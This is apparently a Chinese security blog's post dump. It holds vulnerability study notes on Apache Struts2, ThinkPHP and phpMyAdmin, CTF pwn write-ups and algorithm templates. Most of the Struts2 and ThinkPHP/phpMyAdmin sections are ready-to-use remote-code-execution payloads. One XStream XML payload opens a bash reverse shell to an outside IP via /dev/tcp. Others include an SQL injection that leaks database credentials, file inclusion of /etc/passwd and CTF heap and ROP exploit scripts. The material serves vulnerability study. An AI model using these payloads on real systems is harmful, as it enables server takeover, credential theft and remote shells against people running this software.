中可以使用 \\u0023 来绕过对 # 的过滤，而在修复中开启的安全配置可以被 OGNL 表达式关闭，然后再利用 s2-003 的 payload 攻击。这就是 s2-005。 网上大部分 PoC 都是无回显的，这里放一个带回显的 PoC： 1/example/HelloWorld.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&amp;('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)&amp;('\\u0023mycmd\\u003d\\'id\\'')(bla)(bla)&amp;('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)&amp;(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))&amp;(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))&amp;(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))&amp;(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))&amp;('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&amp;(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla)) s2-007参考 影响版本：2.0.0 - 2.2.3 配置验证规则后，类型转换出错时进行了错误的字符串拼接，从而可以执行 OGNL 表达式。这里的原理和 SQL 注入类似。 1' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + ' s2-008参考 影响版本：2.1.0 - 2.3.1 比较鸡肋的漏洞，开启 devMode 后（默认关闭）直接利用调试接口执行 OGNL 表达式。 1debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,%23cmd=&quot;id&quot;,%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[38],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo)) 这里需要注意，PoC 中 #res=new byte[n] 的 n 不能超过命令执行结果的长度，否则就会直接回显 null。上面是根据 id 结果的长度粗略选取的数字 38 。 s2-009参考 影响版本：2.1.0 - 2.3.1.1 在 s2-005 的修复中过滤了 \\ 等特殊字符，然而对于接受某个参数 example 的接口来说，example 参数的值依然会被当作 OGNL 表达式执行。然后就可以通过类似 example=&lt;OGNL statement&gt;&amp;(example)('bla')=1 来绕过过滤。 1age=4923&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23d),%23writer.close())(bla)&amp;z[(name)(%27bla%27)] s2-012参考 影响版本：2.1.0 - 2.3.13 在 action 配置中的 result 中使用 redirect 类型时，如果使用了变量，如 ${param}，那么在重定向时会对 param 进行 OGNL 表达式解析。 可以直接使用 s2-001 的 PoC： s2-013 | s2-014参考 影响版本：2.0.0 - 2.3.14.1 struts2 的 &lt;s:a&gt; 和 &lt;s:url&gt; 都有一个 includeParams 属性，可以设置为： none - URL 中不包含任何参数（默认） get - 仅包含 URL 中的 GET 参数 all - 在 URL 中包含 GET 和 POST 参数，此时 GET 和 POST 参数都在 query string 中 最后一种情况下解析参数时，会导致 OGNL 表达式执行，造成代码执行。 存在两种 PoC： 1${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())} 1${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())} s2-013 的修复仅仅限制了 ${(#exp)} 格式的 PoC 执行，然而 ${exp} 格式同样可以执行。这导致了 s2-014 的产生。 上面的 $ 都可以换成 %。 s2-015参考 影响版本：2.0.0 - 2.3.14.2 在 action 中配置了 name=&quot;*&quot; ，且 result 中含有变量时，如 {1}.jsp ，那么 {} 中的内容会被当作 OGNL 表达式解析。遗憾的是这种情况下无法使用 &quot;,/,\\ 等特殊字符。 此外，2.3.14.2 版本开始无法使用过去常用的 #_memberAccess['allowStaticMethodAccess']=true 来开启静态方法调用，此时可以通过反射机制来开启。 1%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}.action s2-016参考 影响版本：2.0.0 - 2.3.15 处理重定向前缀 action: / redirect: / redirectAction: 时对后面的 URL 进行 OGNL 解析，导致任意代码执行。 1index.action?redirect:${#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()} s2-045参考 影响版本：2.3.5 - 2.3.31, 2.5 - 2.5.10 发上传数据包时，修改 Content-Type 头使得解析异常，从而导致报错信息被当作 OGNL 表达式执行。 实际上，并不需要使用 POST 方法，也不需要网站存在上传文件功能，只需要 Content-Type 中包含 multipart/form-data 即可。如： 1Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('result',3048+9572)}.multipart/form-data 1Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','ipconfig'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data s2-046参考 影响版本：2.3.5 - 2.3.31, 2.5 - 2.5.10 类似 s2-045，这次修改的是 Content-Disposition 的 filename 字段。最后需要通过 \\x00b 来截断 payload。 1%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','ipconfig'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\x00b 注意上面 \\x00 处在 burp 里需要通过 Hex 界面修改为 00 字节，因此网上 PoC 大多使用 python 脚本编写而不是 burp 重放。 s2-048参考 影响版本：2.0.0 - 2.3.32 struts1 插件中将用户输入的 message 作为 OGNL 表达式执行，导致任意代码执行。这里可以直接使用 s2-045 的 PoC。 s2-052参考 影响版本：2.1.2 - 2.3.33, 2.5 - 2.5.12 REST 插件用 XStream 处理 application/xml 的数据包，在反序列化 XML 时可以导致代码执行。 暂时没有发现带回显的 PoC，可以反弹 shell 来验证： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;bash&lt;/string&gt; &lt;string&gt;-c&lt;/string&gt; &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/174.2.198.151/8080 0&gt;&amp;amp;1&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt;&lt;/map&gt; s2-053参考 影响版本：2.0.1 - 2.3.33， 2.5 - 2.5.10 使用 Freemarker 模板引擎时，如果存在这样的代码： 1&lt;@s.hidden name=&quot;redirectUri&quot; value=redirectUri /&gt; 或者： 1&lt;@s.hidden name=&quot;redirectUri&quot; value=&quot;${redirectUri}&quot; /&gt; 那么此时，用户输入会先被 Freemarker 解析，随后被当作 OGNL 表达式解析，造成代码执行。 1%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','ipconfig'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 注意最后必须添加换行符（\\x0a）。 s2-057参考 影响版本：2.3 - 2.3.34， 2.5 - 2.5.16 如果 alwaysSelectFullNamespace 设置为 true 且 action 中未设置 namespace 或直接使用 * ，那么此时的 namespace 由用户控制，并作为 OGNL 表达式解析。 1${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}","link":"/post/Struts2/"},{"title":"ThinkPHP &amp; phpMyAdmin 漏洞学习","text":"包含 ThinkPHP 5.x RCE / ThinkPHP 5.0.23 RCE / ThinkPHP 2.x RCE / ThinkPHP 5.x SQL 注入导致敏感信息泄露 / phpMyAdmin 4.8.1 远程文件包含 / phpMyAdmin 4.0.x-4.6.2 认证用户 RCE / phpMyAdmin 2.x setup.php 反序列化 ThinkPHP 5.x RCE参考 Controller 中没有过滤掉 \\，但命名空间恰好需要用到 \\，因此可以调用任意类的方法达到 RCE。 1/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=printf&amp;vars[1][]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 ThinkPHP 5.0.23 RCE参考 获取 HTTP 请求类型时没有过滤，导致可以调用任意方法，参数为 POST 的数据。因此可以调用 Request 类的构造函数，覆盖其成员属性 method, filter, get，最终调用 call_user_func 实现 RCE。 1234POST /?s=captcha HTTP/1.1..._method=__construct&amp;filter[]=printf&amp;method=get&amp;get[]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 1234POST /?s=captcha HTTP/1.1..._method=__construct&amp;filter[]=printf&amp;method=get&amp;server[REQUEST_METHOD]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 ThinkPHP 2.x RCE参考 preg_replace 的 /e 模式允许用户输入的参数被执行，造成 RCE。 1234POST /?s=1/2/3/${eval($_POST[merc])} HTTP/1.1...merc=printf(b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327); ThinkPHP 3.0 Lite 模式下同样存在漏洞。 ThinkPHP 5.x SQL 注入导致敏感信息泄露参考 PDO 查询时如果在查询条件中遇到了 in ，就会遍历传入数组 ids 的 key 和 value，而前者在预编译时并没有进行过滤，可以导致预编译结果出错。在 debug 模式开启时（默认），此时的报错会泄露数据库用户名和密码。 1/index.php?ids[1,updatexml(1,concat(0x7e,md5(1),0x7e),1)]=1 phpMyAdmin 4.8.1 远程文件包含 CVE-2018-12613参考 代码中存在文件包含，只需要绕过条件判断中的白名单。判断函数利用 ? 截断 GET 参数，并且还会进行 URL 解码，因此利用二次 URL 编码 %253f 即可绕过白名单，同时读取任意文件。 1/index.php?target=db_sql.php%253f/../../../../etc/passwd 随后，执行 select &lt;?=phpinfo()?&gt;;，抓包获取当前 session，随后访问 session 文件即可执行对应 php 代码： 1/index.php?target=db_sql.php%253f/../../../../tmp/sess_1ee714d1373e5caad9faf122e9ad1798 phpMyAdmin 4.0.x-4.6.2 认证用户 RCE CVE-2016-5734实际影响版本： 4.0.x &lt; 4.0.10.16 4.4.x &lt; 4.4.15.7 4.6.x &lt; 4.6.3 参考 这个问题实际上是 PHP 5.4.7 的 preg_replace 函数的问题。当使用类似如下代码时： 1preg_replace('/'.$user_input.'/i', $replace, $text); 我们可以输入 /e\\0 来注入 /e 修饰符，同时截断后面的内容来达成 RCE。 在 phpMyAdmin 中利用这个漏洞，需要知道系统的用户名密码：exp phpMyAdmin 2.x setup.php 反序列化参考 在 /scripts/setup.php 中没有对 configuration 参数进行过滤就进行了反序列化，因此可以注入一个 PMA_Config 对象，在构造函数中引入其成员变量 source 并通过 eval 执行。既可以读取文件，也可以通过已有文件执行代码。 以读取 /etc/passwd 为例： 123456789&lt;?phpclass PMA_Config { public $source = &quot;/etc/passwd&quot;;}$data = new PMA_Config();echo serialize($data);?&gt; 运行可以得到： 1O:10:&quot;PMA_Config&quot;:1:{s:6:&quot;source&quot;;s:11:&quot;/etc/passwd&quot;;} 之后可以进一步通过 ftp 协议写 shell。","link":"/post/ThinkPHPmyAdmin/"},{"title":"V&amp;N2020 Pwn","text":"第一次见到堆题比栈题解答人数还多的比赛。。 simpleHeap编辑时存在off by one，可以修改下一个chunk的大小后令其进入unsorted bin泄露libc。然后修改malloc_hook为one_gadget，注意需要通过realloc调整rsp来满足one_gadget条件。 123456789101112131415161718192021add(0x18) # 0add(0x68) # 1add(0x68) # 2add(0x18) # 3edit(0,'a'*0x18+'\\xe1')free(1)add(0x68) # 1show(2)base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10leak('base',base)malloc_hook = base+libc.sym['__malloc_hook']add(0x60) # 4 &lt;-&gt; 2free(3)free(2)edit(4,p64(malloc_hook-0x23)+'\\n')add(0x60)add(0x60,flat('a'*11,base+0x4526a,base+libc.sym['realloc']+13))sla(':',str(_add))sla('?',str(0x18)) easyTHeapfree时指针未置NULL。先利用tcache double free泄露堆地址，随后tcache投毒拿到tcache_perthread_struct，修改count令tcache全被填满，再次free时就会进入unsorted bin泄露libc。接下来依然是覆盖malloc_hook为one_gadget以及通过realloc调整rsp，不过由于环境是2.27，one_gadget、偏移量等等都会会有所不同，unsorted bin泄露的地址也变成了main_arena+96而非+88。 123456789101112131415161718192021222324252627add(0x80) # 0add(0x80) # 1free(0)free(0)show(0)heap = uu64(r(6))-0x260leak('heap',heap)tps = heap+0x10add(0x80) # 2 &lt;-&gt; 0edit(2,p64(tps))add(0x80) # 3 &lt;-&gt; 1add(0x80) # 4 &lt;-&gt; tpsedit(4,'\\x07'*8+'\\x00'*0x70+p64(tps+0x78))free(0)show(0)base = uu64(r(6))-0x60-libc.sym['__malloc_hook']-0x10leak('base',base)one = base+0x10a38cmalloc_hook = base+libc.sym['__malloc_hook']edit(4,'\\x07'*8+'\\x00'*0x70+p64(malloc_hook-0x8))add(0x80) # 5edit(5,flat(one,base+libc.sym['realloc']+4))sla(':',str(_add))sla('?',str(0x10)) warmup只能溢出0x10字节，但是上一个栈帧的buf空间较大且可控，因此可以多ret一次回到上一个栈帧的buf里构造ROP链。此外，程序开启了seccomp沙箱禁止execve，因此我们只能构造ORW读flag。幸运的是题目直接给了puts地址，可以得到libc地址从而使用libc的gadgets，而ORW使用的缓冲区也可以利用libc的rw段。 12345678910111213141516171819202122232425ru('0x')puts = int(ru('\\n'),16)base = puts-libc.sym['puts']leak('base',base)pop_rdi = base+0x21102pop2 = base+0x1150c9 # rdx,rsiret = base+0x937open = base+libc.sym['open']read = base+libc.sym['read']buf = base+libc.sym['_IO_2_1_stderr_']chain = [ # read(0,buf,8) pop_rdi,0,pop2,8,buf,read, # open(buf,0,0) pop_rdi,buf,pop2,0,0,open, # read(3,buf,0x100) pop_rdi,3,pop2,0x100,buf,read, # puts(buf) pop_rdi,buf,puts]sa('thing:',flat(chain))payload = flat('a'*0x70,'a'*8,ret)sa('name?',payload)s('/flag\\x00\\x00\\x00') babybabypwn_1看到程序主动调用syscall(15,&amp;buf)可知是SROP，我们需要在buf里放伪造的Sigreturn Frame，然后程序就会调用rt_sigreturn恢复我们伪造的frame。同样开启了沙箱，依然是构造ORW读flag。 这里在使用pwnlib.rop.srop模块时，用SigreturnFrame构造时出现了一些问题，暂时还不清楚原因，使用了手动构造frame的办法。 123456789101112131415161718192021222324252627282930313233343536ru('0x')puts = int(ru('\\n'),16)base = puts-libc.sym['puts']leak('base',base)pop_rdi = base+0x21102pop2 = base+0x1150c9syscall = base+libc.sym['syscall']open = base+libc.sym['open']read = base+libc.sym['read']buf = base+0x3c6500frame = p64(0) * 12frame += p64(0) # rdiframe += p64(0) # rsiframe += p64(0) # rbpframe += p64(0) # rbxframe += p64(buf-0x10) # rdxframe += p64(0) # raxframe += p64(0x100) # rcxframe += p64(buf) # rspframe += p64(syscall) # ripframe += p64(0) # eflagsframe += p64(0x33) # cs/fs/gsframe += p64(0)*7sa('message:',frame)chain = [ '/flag\\x00\\x00\\x00',0, # open(buf-0x10,0,0) pop_rdi,buf-0x10,pop2,0,0,open, # read(3,buf+0x100,0x100) pop_rdi,3,pop2,0x100,buf+0x100,read, # puts(buf+0x100) pop_rdi,buf+0x100,puts]s(flat(chain)) 更新：参考AiDai师傅的方法，可以自动构造frame，并且不需要系统调用： 123456789101112131415161718192021222324252627282930ru('0x')puts = int(ru('\\n'),16)base = puts-libc.sym['puts']leak('base',base)pop_rdi = base+0x21102pop2 = base+0x1150c9open = base+libc.sym['open']read = base+libc.sym['read']buf = base+libc.bss()frame = SigreturnFrame()frame.rdi = 0frame.rsi = bufframe.rdx = 0x100frame.rsp = bufframe.rip = readsa('message:',str(frame)[8:])chain = [ # read(0,buf,0x100) pop_rdi,0,pop2,0x100,buf,read, # open(buf,0,0) pop_rdi,buf,pop2,0,0,open, # read(3,buf,0x100) pop_rdi,3,pop2,0x100,buf,read, # puts(buf) pop_rdi,buf,puts]s(flat(chain))s('/flag\\x00')","link":"/post/VN2020Pwn/"},{"title":"OJ 常用的模板们","text":"全是不太能记得住的模板。 线段树(EOJ 2525) 有n个灯，m次操作，0表示一段区间内灯的状态全部反转，1表示询问一段区间内亮着的灯的数量。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1e5+5;int st[maxn&lt;&lt;2], add[maxn&lt;&lt;2], n, m, flag, s, e;void pushdown(int rt, int l, int r){ int mid = (l+r) &gt;&gt; 1; st[rt&lt;&lt;1] = mid-l+1 - st[rt&lt;&lt;1]; st[rt&lt;&lt;1|1] = r-mid - st[rt&lt;&lt;1|1]; add[rt&lt;&lt;1] ^= add[rt]; add[rt&lt;&lt;1|1] ^= add[rt]; add[rt] = 0;}void update(int rt, int s, int e, int l, int r){ if (s &lt;= l &amp;&amp; r &lt;= e) { st[rt] = r-l+1 - st[rt]; add[rt] ^= 1; return; } int mid = (l+r) &gt;&gt; 1; if (add[rt]) pushdown(rt, l, r); if (s &lt;= mid) update(rt&lt;&lt;1, s, e, l, mid); if (e &gt; mid) update(rt&lt;&lt;1|1, s, e, mid+1, r); st[rt] = st[rt&lt;&lt;1] + st[rt&lt;&lt;1|1];}int query(int rt, int s, int e, int l, int r){ if (s &lt;= l &amp;&amp; r &lt;= e) return st[rt]; int ans = 0, mid = (l+r) &gt;&gt; 1; if (add[rt]) pushdown(rt, l, r); if (s &lt;= mid) ans += query(rt&lt;&lt;1, s, e, l, mid); if (e &gt; mid) ans += query(rt&lt;&lt;1|1, s, e, mid+1, r); return ans;}int main(){ scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for (int i = 0; i &lt; m; ++i) { scanf(&quot;%d%d%d&quot;, &amp;flag, &amp;s, &amp;e); if (flag) printf(&quot;%d\\n&quot;, query(1, s, e, 1, n)); else update(1, s, e, 1, n); } return 0;} 判断两条线段是否相交包括了一个或多个点重合的情况。输入点的坐标顺序为Ax,Ay,Bx,By,Cx,Cy,Dx,Dy，判断线段AB与线段CD是否相交。由于问题比较简单，没有用到向量、叉积什么的，而是用了奇怪的作图法+不证明直接推广法（？）。可以画个图验证一下。对于稍难的计算几何题，这些奇技淫巧就没有用了。 1234567891011121314#include &lt;stdio.h&gt;int main(){ int x1, y1, x2, y2, x3, y3, x4, y4; while (~scanf(&quot;%d%d%d%d%d%d%d%d&quot;, &amp;x1, &amp;y1, &amp;x2, &amp;y2, &amp;x3, &amp;y3, &amp;x4, &amp;y4)){ double k = 1.0 * (y1 - y2) / (x1 - x2); double n = y1 - k * x1; double ans1 = k * x3 + n, ans2 = k * x4 + n; if ((ans1 &lt;= y3 &amp;&amp; ans2 &gt;= y4) || (ans1 &gt;= y3 &amp;&amp; ans2 &lt;= y4)) printf(&quot;Yes\\n&quot;); else printf(&quot;No\\n&quot;); } return 0;} 计算多边形面积我们假定得到了按照逆时针顺序给出的n个顶点的坐标x1, y1, x2, y2 ... xn, yn且坐标均为整数。那么最简洁的方法就是计算向量叉积（其实也是算行列式）来求，对凹多边形也适用。直观的理解是将多边形分为了若干个小三角形分别求面积。 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;using namespace std;int main(void){ int n, i, x[101], y[101]; double sum; while(cin &gt;&gt; n &amp;&amp; n){ for (i = 0; i &lt; n; ++i) cin &gt;&gt; x[i] &gt;&gt; y[i]; sum = 0; for (i = 0; i &lt; n - 1; ++i) sum += (x[i] * y[i + 1] - x[i + 1] * y[i]); sum = (fabs(sum + x[i] * y[0] - x[0] * y[i])) * 1.0 / 2; printf(&quot;%.1f\\n&quot;, sum); }} 最大连续子序列的和由于要让和最大，可以直接屏蔽掉和为负数的情况(tot &lt; 0)，但是由于求的是连续子序列的和，不能一遇到负数的项就扔掉。如：5 6 -1 5 4 -7，最大连续子序列和为6+(-1)+5+4=14。然后用tot更新ans就行了。 123456789101112131415161718192021#include &lt;stdio.h&gt;int main(){ int cas, i, n; scanf(&quot;%d&quot;, &amp;cas); while (cas--){ scanf(&quot;%d&quot;, &amp;n); int a[100] = {0}; for (i = 0; i &lt; n; ++i) scanf(&quot;%d&quot;, &amp;a[i]); int ans = a[0], tot = 0; for (i = 0; i &lt; n; ++i){ if (tot &gt; 0) tot += a[i]; else tot = a[i]; if (tot &gt; ans) ans = tot; } printf(&quot;%d\\n&quot;, ans); } return 0;} 高斯消元求行列式及逆矩阵 给定一个 n*n 的矩阵，输出它的行列式值和逆矩阵（保证存在）。 期末复习线性代数时，发现自己求逆矩阵总是求错，于是干脆写了个程序来实现。。高斯消元法求解线性方程组只要稍微修改下代码就可以，判断无解/无穷多解也不难，至于求自由未知量然后输出任意一解……还没有想好。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;bits/stdc++.h&gt;using namespace std;const double eps = 1e-6;const int N = 12;void gauss(double a[][N], double b[], double x[], int n){ int i; double s; for (int k = 1; k &lt;= n; ++k) { for (i = k; i &lt;= n &amp;&amp; fabs(a[i][k]) &lt; eps; ++i); if (i != k) { for (int j = k; j &lt;= n; ++j) swap(a[i][j], a[k][j]); swap(b[i], b[k]); } for (i = k+1; i &lt;= n; ++i) { s = a[i][k] / a[k][k]; for (int j = k; j &lt;= n; ++j) a[i][j] -= a[k][j] * s; b[i] -= b[k] * s; } } for (i = n; i &gt;= 1; --i) { s = b[i]; for (int j = i+1; j &lt;= n; ++j) s -= x[j] *a[i][j]; x[i] = s / a[i][i]; if (fabs(x[i]) &lt; eps) x[i] = 0; }}int main(){ double a[N][N], b[N], x[N], mt[N][N], mk[N][N]; int n; cin &gt;&gt; n; for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) { cin &gt;&gt; mk[i][j]; a[i][j] = mk[i][j]; } b[i] = 0; } gauss(a, b, x, n); double det = 1; for (int i = 1; i &lt;= n; ++i) det *= a[i][i]; if (fabs(det) &lt; eps) det = 0; printf(&quot;%0.2f\\n&quot;, det); for (int k = 1; k &lt;= n; ++k) { for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt;= n; ++j) a[i][j] = mk[i][j]; b[i] = 0; } b[k] = 1; gauss(a, b, x, n); for (int i = 1; i &lt;= n; ++i) mt[i][k] = x[i]; } for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt; n; ++j) printf(&quot;%0.2f &quot;, mt[i][j]); printf(&quot;%0.2f\\n&quot;, mt[i][n]); } return 0;} 计算两个一元多项式的乘积算是高精度乘法？细节比较多。降幂输出非零系数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#define N 100void readpoly(char *s, int* poly){ while (*s){ int sign = 1, a = 0, i = 0; if (*s == '+' ) ++s; else if (*s == '-') sign = -1, ++s; while (isdigit(*s)){ a = a * 10 + *s -'0'; ++s; } if (a == 0) a = 1; if (*s != 'x') {poly[0] = a * sign; return;} else ++s; if (*s == '^') ++s; while (isdigit(*s)) { i = i * 10 + *s - '0'; ++s; } if (i == 0) i = 1; poly[i] = a * sign; }}void multiply(char *s1,char *s2, int* poly){ int poly1[N] = {0}, poly2[N] = {0}, i, j; readpoly(s1, poly1); readpoly(s2, poly2); for (i = 0; i &lt; N / 2; ++i) for (j = 0; j &lt; N / 2; ++j) poly[i + j] += poly1[i] * poly2[j];}int main(){ char s1[N+1], s2[N+1]; while(scanf(&quot;%s%s&quot;, s1, s2) != EOF){ int poly[N] = {0}, out[N], n = 0, i; multiply(s1, s2, poly); for (i = 0; i &lt; N; ++i) if (poly[i]) out[n++] = 